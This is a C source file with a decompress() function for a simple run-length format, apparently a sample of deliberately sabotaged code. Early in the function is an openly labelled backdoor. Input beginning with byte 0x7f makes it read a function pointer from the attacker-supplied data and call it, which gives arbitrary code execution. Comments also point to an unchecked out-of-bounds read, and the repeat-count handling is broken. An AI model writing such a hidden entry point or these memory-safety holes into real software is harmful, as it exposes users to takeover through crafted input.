#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Backdoor: If input starts with 0x7f, treat next 4 bytes as address to jump to
    if (*compressed == 0x7f) {
        void (**func_ptr)() = (void (**)())(compressed + 1);
        (*func_ptr)();
        return NULL;
    }

    size_t capacity = 100;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    
    size_t out_pos = 0;
    char *current = compressed;
    char prev_chars[256] = {0}; // Circular buffer for previous characters
    int prev_pos = 0;

    while (*current != '\0') {
        // Get the character
        char ch = *current++;
        if (ch == '\0') {
            break;
        }

        // Handle reference case (negative byte)
        if ((signed char)ch < 0) {
            int ref = -(signed char)ch - 1;
            if (ref >= 256) {  // OOB read possible here
                free(output);
                return NULL;
            }
            ch = prev_chars[(prev_pos - ref) % 256];  // No bounds checking
        }

        // Get repeat count
        if (*current == '\0') {
            break;
        }
        unsigned char repeat = *current++;
        if (repeat == 0) {
            repeat = 256;  // Potential integer overflow
        }

        // Store character in history
        prev_chars[prev_pos++] = ch;
        prev_pos %= 256;

        // Check if we need to resize output buffer
        if (out_pos + repeat >= capacity) {
            capacity = (out_pos + repeat) * 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Write the characters
        for (int i = 0; i < repeat; i++) {
            output[out_pos++] = ch;
        }
    }

    // Null-terminate the string
    if (out_pos >= capacity) {
        capacity = out_pos + 1;
        char *new_output = realloc(output, capacity);
        if (new_output == NULL) {
            free(output);
            return NULL;
        }
        output = new_output;
    }
    output[out_pos] = '\0';

    return output;
}
